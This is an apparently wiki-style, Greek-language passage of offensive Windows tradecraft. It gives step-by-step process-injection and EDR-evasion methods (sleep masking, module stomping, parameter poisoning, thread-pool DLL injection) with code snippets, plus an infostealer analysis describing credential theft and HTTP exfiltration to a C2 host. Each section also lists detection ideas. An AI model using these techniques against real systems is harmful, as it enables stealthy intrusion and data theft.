Έτσι, οι αλυσίδες sleep τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε ύπνο

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να προκαλέσει προβλήματα σε συστήματα CET Shadow Stack, επειδή ένα πλαστογραφημένο `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια stack του `NT_TIB` / TEB του (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιουργήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε ύπνο με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφα το spoofed `Rsp`/την κατάσταση του stack.
- Κατά το διάστημα ύπνου, αντιγράψτε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Μετά την ολοκλήρωση της αναμονής, επαναφέρετε το αρχικό TIB και το thread context.

Έτσι διατηρείται ένας δείκτης εντολής συνεπής με το CET, ενώ παραπλανώνται οι EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για την επικύρωση των unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue είναι υπερβολικά χαρακτηριστικό, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread χρησιμοποιώντας queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Τοποθετήστε σε ουρά τα έτοιμα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack thread των 64 KB.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσετε ατομικά το start event και να μπλοκάρετε.
- Αναστείλετε το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να περιορίσετε το χρονικό παράθυρο στο οποίο ένας scanner θα μπορούσε να εντοπίσει ένα μερικώς επαναφερμένο stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα signature helper-thread/APC, διατηρώντας παράλληλα τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για Detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από τα `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` που ακολουθείται από απευθείας εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Ακριβές Module Stomping

Το module stomping εκτελεί payloads από το **`.text` section ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να εκχωρεί προφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο image που υποστηρίζεται από αρχείο στον δίσκο**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει διαδρομές κώδικα που χρειάζεται ακόμη η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην είναι φορτωμένο στην απομακρυσμένη διεργασία, ενώ μια πολύ μικρή περιοχή κώδικα μπορεί να προκαλέσει crash της διεργασίας. Μια πιο αξιόπιστη διαδικασία είναι:

1. Απαριθμήστε τα modules της διεργασίας-στόχου και κρατήστε μια λίστα include **μόνο με ονόματα** των ήδη φορτωμένων DLLs.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
3. Σαρώστε υποψήφια DLLs στον δίσκο και συγκρίνετε το PE section **`.text` `Misc_VirtualSize`** με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αντανακλά το μέγεθος του εκτελέσιμου section **κατά τη χαρτογράφησή του στη μνήμη**.
4. Αναλύστε τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας εξαγόμενης συνάρτησης ως αρχικό offset για το stomp.
5. Υπολογίστε την **εμβέλεια επίδρασης**: αν το payload ξεπερνά τα όρια της επιλεγμένης συνάρτησης, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Τυπικά βοηθητικά εργαλεία recon/επιλογής που συναντώνται στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Λειτουργικές σημειώσεις
- Προτιμήστε DLL που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, για να αποφύγετε την τηλεμετρία των `LoadLibrary`/απροσδόκητων φορτώσεων image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα μπορεί να προσπελάσουν τα αλλοιωμένα bytes πριν ή μετά τη δημιουργία του thread.
- Για μεγάλα implants συχνά απαιτείται η αλλαγή της ενσωμάτωσης του shellcode από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον κώδικα του injector.

Ιδέες ανίχνευσης
- Απομακρυσμένες εγγραφές σε **εκτελέσιμες σελίδες που υποστηρίζονται από image** (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές εκχωρήσεις RWX/RX.
- Σημεία εισόδου export των οποίων τα bytes στη μνήμη δεν ταιριάζουν πλέον με το αντίστοιχο αρχείο στον δίσκο.
- Απομακρυσμένα threads ή μετατοπίσεις του context που ξεκινούν εκτέλεση μέσα σε ένα νόμιμο export DLL του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες DLL `.text`, ακολουθούμενες από δημιουργία thread.

## Poisoning παραμέτρων διεργασίας (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που αποφεύγει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε μια διεργασία-στόχο που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη θυγατρική διεργασία** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Φορείς που μπορούν να δηλητηριαστούν και αντιγράφονται από το `CreateProcessW`

Χρήσιμοι φορείς είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των φορέων:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και περιορίζεται στους **32.767 χαρακτήρες Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα μπλοκ περιβάλλοντος Unicode με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, οι οποίες τερματίζονται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση `ShellInfo` πρέπει να θεωρείται λεπτομέρεια υλοποίησης και όχι σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη θυγατρική διεργασία με δεδομένα εκκίνησης που ελέγχει ο επιτιθέμενος και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή απομακρυσμένης αναζήτησης χωρίς API απομακρυσμένης εγγραφής

Μετά τη δημιουργία της θυγατρικής διεργασίας, εντοπίστε το αντιγραμμένο buffer με **μόνο για ανάγνωση** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Ακολουθήστε το `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW` και όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργία της διεργασίας κανονικά (όχι σε αναστολή)
2. Μετατροπή της επιλεγμένης σελίδας παραμέτρων σε εκτελέσιμη με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποίηση του handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατεύθυνση της εκτέλεσης με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικατάσταση του `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που επιστράφηκε.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός null-byte και staged shellcode

Και οι τρεις φορείς είναι **δεδομένα τύπου string ή παρόμοια**, οπότε ένα ακατέργαστο payload που περιέχει `0x00` αποκόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free πρώτο στάδιο** που ανασυνθέτει σταθερές κατά τον χρόνο εκτέλεσης και στη συνέχεια φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στο stack, ορίσματα API, διαδρομές DLL ή loader shellcode δεύτερου σταδίου χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω stack από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στο stack του στόχου
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο σε όριο 16 bytes** πριν από την κλήση

Έπειτα, το δεύτερο στάδιο μπορεί να αντιγραφεί από το stack σε μια εκχώρηση `PAGE_READWRITE`, να αλλάξει σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να εκτελεστεί με άλμα σε αυτό, αποφεύγοντας έτσι την άμεση εκχώρηση RWX.

### Ιδέες για ανίχνευση

Οι συγγραφείς αναφέρουν τις εξής καλές ευκαιρίες για hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **εκτελέσιμες τις σελίδες παραμέτρων διεργασίας**
- αλλαγή προστασίας που ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και, στη συνέχεια, του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες ή υψηλής εντροπίας τιμές `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

- Το P3 είναι ένα **τέχνασμα μεταφοράς μεταξύ διεργασιών**, όχι από μόνο του ένα πλήρες primitive εκτέλεσης: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή δικαιωμάτων σε execute και μια μέθοδο ανακατεύθυνσης της εκτέλεσης.
- Οι συγγραφείς εξέτασαν το `RtlCreateProcessReflection` / Dirty Vanity, αλλά το απέρριψαν επειδή καταλήγει εσωτερικά σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## Εγχυση μέσω pipe STDIN κονσόλας

Μια διαδραστική διεργασία-παιδί κονσόλας μπορεί επίσης να χρησιμοποιηθεί ως **primitive μεταφοράς payload**. Ο injector ανακατευθύνει την τυπική είσοδο του παιδιού σε ένα pipe και στέλνει έναν δείκτη ακολουθούμενο από shellcode. Αφού το πρόγραμμα κονσόλας διαβάσει τα δεδομένα στη δική του ιδιωτική μνήμη, ο injector εντοπίζει αυτό το buffer, το καθιστά εκτελέσιμο και ανακατευθύνει ένα thread του παιδιού σε αυτό. Έτσι αποφεύγονται τα `VirtualAllocEx` και `WriteProcessMemory`, αλλά πρόκειται και πάλι για process injection και όχι για γενική παράκαμψη EDR.<sup>[[41]](#references)</sup>

Παρά την περιγραφή «named-pipe», η υλοποίηση αναφοράς καλεί το `CreatePipe`, το οποίο δημιουργεί ένα **anonymous pipe**. Τα Windows υλοποιούν εσωτερικά τα anonymous pipes με μοναδικά ονομασμένα αντικείμενα pipe, αλλά το PoC ούτε επιλέγει διαδρομή `\\.\pipe\<name>` ούτε καλεί το `CreateNamedPipe`. Δημιουργεί handles με δυνατότητα κληρονομικότητας και προεπιλεγμένο security descriptor, τοποθετεί το read handle στο `STARTUPINFO.hStdInput`, ορίζει το `STARTF_USESTDHANDLES` και εκκινεί ένα νέο παιδί με ενεργοποιημένη την κληρονομικότητα των handles. Επομένως, αυτό το PoC εκκινεί το παρεχόμενο εκτελέσιμο κονσόλας· δεν συνδέει το pipe του σε υπάρχουσα διεργασία.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Ροή εργασίας αναφοράς

Η υλοποίηση χρησιμοποιεί την ακόλουθη ακολουθία:<sup>[[41]](#references)</sup>

1. Δημιουργεί ζεύγη anonymous pipe για τα `STDIN` και `STDOUT` του παιδιού. Απενεργοποιεί την κληρονομικότητα στα δύο handles της πλευράς του γονέα και κλείνει τα αντίγραφα της πλευράς του παιδιού στον γονέα μετά τη δημιουργία της διεργασίας.
2. Εκκινεί ένα διαδραστικό εκτελέσιμο, όπως το `netsh.exe` ή το `nslookup.exe`, με `CREATE_NEW_CONSOLE`. Το παιδί κληρονομεί τα ανακατευθυνόμενα standard handles.
3. Στέλνει ολόκληρο τον δυαδικό πίνακα `rawData` με `WriteFile` μέσω του handle `STDIN` στην πλευρά του γονέα. Το πρόγραμμα κονσόλας καταναλώνει τα bytes και αφήνει ένα αντίγραφο σε μία από τις ιδιωτικές δεσμευμένες περιοχές του.
4. Διατρέχει τον χώρο διευθύνσεων του παιδιού με `VirtualQueryEx`, διαβάζει υποψήφιες περιοχές `MEM_PRIVATE` με `ReadProcessMemory` και αναζητά τον δείκτη στην αρχή του `rawData`.
5. Αλλάζει την προστασία του εντοπισμένου buffer σε `PAGE_EXECUTE_READWRITE` με `VirtualProtectEx`.
6. Εντοπίζει το κύριο thread, το αναστέλλει, ορίζει το `RIP` σε `found_address + 0x19` με `NtSetContextThread` και το συνεχίζει.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Η παρεχόμενη υλοποίηση είναι ειδική για x64: τροποποιεί το `CONTEXT.Rip` και το ενσωματωμένο payload είναι x64 shellcode. Το `rawData` ξεκινά με δείκτη 25 byte, επομένως τα εκτελέσιμα byte αρχίζουν στο δεκαεξαδικό offset `0x19`. Κατά την αντικατάσταση του payload, διατηρήστε αυτή τη διάταξη ή ενημερώστε ταυτόχρονα τον δείκτη, το διάνυσμα αναζήτησης, το μέγεθος του πίνακα και το offset εκτέλεσης. Τα σχόλια του πηγαίου κώδικα αναφέρουν επίσης τα `0x0A`, `0x0D` και `0x1A` ως bad characters. Αυτή η διαδικασία δεν τροποποιεί το token ή τα προνόμια του child process.<sup>[[41]](#references)</sup>

Για μικρά native helpers και μοτίβα μεταγλώττισης payload, ανατρέξτε στο [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Εγχύση DLL μέσω callback thread pool χωρίς shellcode (DLLParty)

Το DLLParty προσαρμόζει την έγχυση μέσω thread pool τύπου PoolParty, ώστε να κάνει ένα υπάρχον worker του target να καλέσει το `LoadLibraryA`, αντί να εκτελέσει ένα εγχυμένο callback stub. Ο μηχανισμός dispatch είναι ένα `TP_DIRECT` completion που τοποθετείται στην I/O completion port του pool του target. Αυτό δεν παρακάμπτει τα δικαιώματα διεργασίας: το PoC καλεί `OpenProcess(PROCESS_ALL_ACCESS)` και χρειάζεται μνήμη του target με δυνατότητα ανάγνωσης/εγγραφής, καθώς και handles worker-factory και completion-port που μπορούν να αντιγραφούν.<sup>[[46]](#references)[[47]](#references)</sup>

Στα Windows x64, το worker περνά έναν δείκτη στο `TP_CALLBACK_INSTANCE` που βρίσκεται στη στοίβα του, μέσω του `RCX`, του πρώτου ορίσματος callback. Το `LoadLibraryA` ερμηνεύει τον ίδιο δείκτη ως `LPCSTR`. Στη δοκιμασμένη διαδρομή, το `TppWorkerThread` δημιουργεί τον δείκτη στη θέση `RSP+0x178`, ενώ η πρώτη συνηθισμένη εγγραφή του σε αυτό το αντικείμενο γίνεται στη θέση `RSP+0x1d0`. Επομένως, μια null-terminated διαδρομή DLL που χωρά στο αρχικό πρόθεμα των 0x58 byte μπορεί να τοποθετηθεί στην αρχή της instance χωρίς να αντικατασταθεί πριν από το dispatch. Πρόκειται για παρατήρηση ειδική για το συγκεκριμένο build, όχι για τεκμηριωμένη εγγύηση του Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Η διαδικασία αναφοράς είναι η εξής:<sup>[[46]](#references)[[47]](#references)</sup>

1. Απαριθμήστε τα handles του target με `NtQuerySystemInformation(SystemHandleInformation)` και εντοπίστε το `TpWorkerFactory` εξετάζοντας τους τύπους αντικειμένων. Αντιγράψτε ένα handle worker-factory και ζητήστε `WorkerFactoryBasicInformation`· το `StartParameter` δίνει το απομακρυσμένο `TP_POOL`. Παραλείψτε τις factories με `TotalWorkerCount == 0`.
2. Διαβάστε το `TP_POOL.CompletionPort` και διατρέξτε την ιδιωτική λίστα worker του pool. Στο δοκιμασμένο build Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), η κεφαλή βρίσκεται στη θέση `pool+0x60`· κάθε σύνδεσμος βρίσκεται στη θέση `worker+0x10`, επομένως το slot της callback instance στη θέση `worker+0x38` ισούται με `link+0x28`. Το PoC ελέγχει τη στοίχιση των δεικτών, την αμοιβαιότητα των συνδέσμων, την ιδιοκτησία του pool, τα μη μηδενικά thread IDs, τους επαναλαμβανόμενους κόμβους και τη σταθερότητα της κεφαλής της λίστας.
3. Γράψτε τη διαδρομή DLL σε **κάθε** slot worker που ανακτήθηκε, επειδή οποιοδήποτε worker μπορεί να λάβει το queued completion. Τοποθετήστε ένα `TP_DIRECT` σε εγγράψιμη μνήμη του target, με `Callback = LoadLibraryA`. Το PoC χρησιμοποιεί το `last_slot-0x500` σε στοίβα worker αντί για `VirtualAllocEx`· αυτό το offset είναι πειραματικό και δεν πρέπει να συμπίπτει με ενεργά δεδομένα της στοίβας.
4. Αντιγράψτε το handle της completion port του target και καλέστε `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Η διεύθυνση του απομακρυσμένου `TP_DIRECT` είναι το completion key. Ένα υπάρχον worker καλεί στη συνέχεια το `LoadLibraryA` χρησιμοποιώντας τον αντικατασταθέντα δείκτη callback instance, φορτώνοντας ένα DLL στο οποίο έχει ήδη πρόσβαση το target.

Το PoC δέχεται PID target (`DLLParty.exe <target_pid>`) και χρησιμοποιεί μια hard-coded διαδρομή DLL στο `DLLParty.cpp`· ορίστε μια διαδρομή στην οποία έχει πρόσβαση το target πριν δημιουργήσετε x64 εκτελέσιμο. Χρησιμοποιεί επίσης τη διεύθυνση `LoadLibraryA` της δικής του διεργασίας ως απομακρυσμένο callback, επομένως προϋποθέτει ότι η διεύθυνση είναι έγκυρη και στο target. Ο κώδικας δεν ελέγχει αν το μήκος της διαδρομής χωρά στο πρόθεμα των 0x58 byte, ούτε αν η διάσχιση των worker βρήκε κάποιο slot πριν από την προσπέλαση του τελευταίου στοιχείου. Επαληθεύστε ξανά τα ιδιωτικά offsets, τη διάταξη της στοίβας και τον εγγράψιμο χώρο για το build του target. Η παράλειψη των `CreateRemoteThreadEx`, shellcode και `VirtualAllocEx` δεν εξαλείφει τις εγγραφές μεταξύ διεργασιών ή τα telemetry φόρτωσης DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft του SantaStealer για fileless evasion και κλοπή διαπιστευτηρίων

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστευτήρια σε μία ενιαία διαδικασία.<sup>[[24]](#references)</sup>

### Έλεγχος διάταξης πληκτρολογίου και καθυστέρηση sandbox

- Μια σημαία διαμόρφωσης (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί κυριλλική διάταξη, το δείγμα δημιουργεί έναν κενό δείκτη `CIS` και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν ενεργοποιείται ποτέ σε εξαιρούμενες τοπικές ρυθμίσεις, ενώ αφήνει ένα artifact για hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Διαστρωματωμένη λογική `check_antivm`

- Η παραλλαγή A διατρέχει τη λίστα διεργασιών, κατακερματίζει κάθε όνομα με ένα προσαρμοσμένο κυλιόμενο checksum και το συγκρίνει με ενσωματωμένες λίστες αποκλεισμού για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει καταλόγους εργασίας όπως το `C:\analysis`.
- Η παραλλαγή B ελέγχει ιδιότητες συστήματος (κατώτατο όριο πλήθους διεργασιών, πρόσφατος χρόνος λειτουργίας), καλεί το `OpenServiceA("VBoxGuest")` για να εντοπίσει τα additions του VirtualBox και εκτελεί ελέγχους χρονισμού γύρω από αναστολές, ώστε να εντοπίσει το single-stepping. Κάθε θετικό εύρημα ακυρώνει την εκτέλεση πριν από την εκκίνηση των modules.

### Fileless helper + διπλό reflective loading με ChaCha20

- Το κύριο DLL/EXE ενσωματώνει ένα Chromium credential helper, το οποίο είτε αποθηκεύεται στον δίσκο είτε γίνεται χειροκίνητο mapping στη μνήμη· η fileless λειτουργία επιλύει μόνη της τα imports/relocations, ώστε να μη δημιουργούνται αρχεία helper.
- Αυτό το helper αποθηκεύει ένα DLL δεύτερου σταδίου, κρυπτογραφημένο δύο φορές με ChaCha20 (δύο κλειδιά 32 byte + nonce 12 byte). Μετά και τα δύο περάσματα, φορτώνει ανακλαστικά το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Οι ρουτίνες του ChromElevator χρησιμοποιούν reflective process hollowing με direct syscalls για να κάνουν injection σε ένα ενεργό Chromium browser, να κληρονομήσουν κλειδιά AppBound Encryption και να αποκρυπτογραφήσουν κωδικούς πρόσβασης/cookies/πιστωτικές κάρτες απευθείας από βάσεις δεδομένων SQLite, παρά τις ενισχύσεις ασφαλείας του ABE.

### Αρθρωτή συλλογή στη μνήμη και εξαγωγή δεδομένων μέσω HTTP σε τμήματα

- Η `create_memory_based_log` διατρέχει έναν καθολικό πίνακα δεικτών συναρτήσεων `memory_generators` και δημιουργεί ένα thread για κάθε ενεργοποιημένο module (Telegram, Discord, Steam, στιγμιότυπα οθόνης, έγγραφα, επεκτάσεις browser κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε κοινόχρηστα buffers και αναφέρει τον αριθμό αρχείων του μετά από περίοδο αναμονής join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη στατικά συνδεδεμένη βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` αναστέλλεται για 15 δευτερόλεπτα και μεταδίδει το αρχείο σε τμήματα των 10 MB μέσω HTTP POST προς το `http://<C2>:6767/upload`, πλαστογραφώντας ένα όριο `multipart/form-data` browser (`----WebKitFormBoundary***`). Κάθε τμήμα προσθέτει τα `User-Agent: upload`, `auth: <build_id>`, προαιρετικά το `w: <campaign_tag>`, ενώ στο τελευταίο τμήμα προστίθεται το `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασύνθεση.

## References

- [1] [Προηγμένες τεχνικές αποφυγής εντοπισμού: Ακριβές module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ιστολόγιο](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: τέλος στην επιείκεια για το malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – τεκμηρίωση](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – δείγμα](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – δείγμα](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC για πλαστογράφηση call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Νέα αλυσίδα μόλυνσης και συσκότιση βασισμένη στο ConfuserEx για το DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Κατάχρηση forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Κατάλογος forwarded exports των Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Σειρά αναζήτησης βιβλιοθηκών δυναμικής σύνδεσης](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Ασφάλεια διεργασιών και δικαιώματα πρόσβασης](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Αναφορά EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Εκκινητής CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
